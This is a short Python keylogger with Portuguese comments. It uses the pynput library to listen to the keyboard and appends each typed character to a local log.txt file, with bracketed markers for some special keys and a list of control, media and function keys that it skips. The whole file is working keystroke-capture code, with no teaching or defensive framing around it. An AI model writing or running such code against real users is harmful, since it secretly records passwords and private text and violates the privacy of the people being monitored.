# coppy by Isadora ferrão 26/03/2026
#Adicionado teclas de controle e funções especiais para ignorar, como Shift, Ctrl, Alt, Caps Lock, Tab, Esc, Enter, Backspace, Delete, setas de navegação, Home, End, Page Up, Page Down, Insert, Menu, Num Lock, Pause, Print Screen, Scroll Lock e teclas de mídia (Volume Up/Down/Mute, Play/Pause, Next/Previous) e as teclas de função (F1-F12).

from pynput import keyboard


#ignorar teclas de controle e funções especiais
IGNORAR = {keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l,
           keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l,
           keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l,
           keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.cmd_l,
           keyboard.Key.caps_lock, keyboard.Key.tab, keyboard.Key.esc,
           keyboard.Key.enter, keyboard.Key.backspace, keyboard.Key.delete,
           keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right,
           keyboard.Key.home, keyboard.Key.end, keyboard.Key.page_up, keyboard.Key.page_down,
           keyboard.Key.insert, keyboard.Key.menu, keyboard.Key.num_lock, keyboard.Key.pause, keyboard.Key.print_screen, keyboard.Key.scroll_lock,
           keyboard.Key.media_volume_up, keyboard.Key.media_volume_down, keyboard.Key.media_volume_mute,
           keyboard.Key.media_play_pause, keyboard.Key.media_next, keyboard.Key.media_previous,
           keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4, keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8, keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12
           }


#firulas para registrar as teclas pressionadas
def on_press(key):
    try:
        #se for uma tecla de controle, não a registre
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            
            elif key == keyboard.Key.enter:
                f.write("\n")
            

            elif key == keyboard.Key.tab:
                f.write("\t")
            
                
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
             

            elif key == keyboard.Key.esc:
                f.write("[ESC]")
             

            elif key in IGNORAR:
                pass    
            else:
                f.write(f"[{key}]")
             

#captura as teclas pressionadas
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()



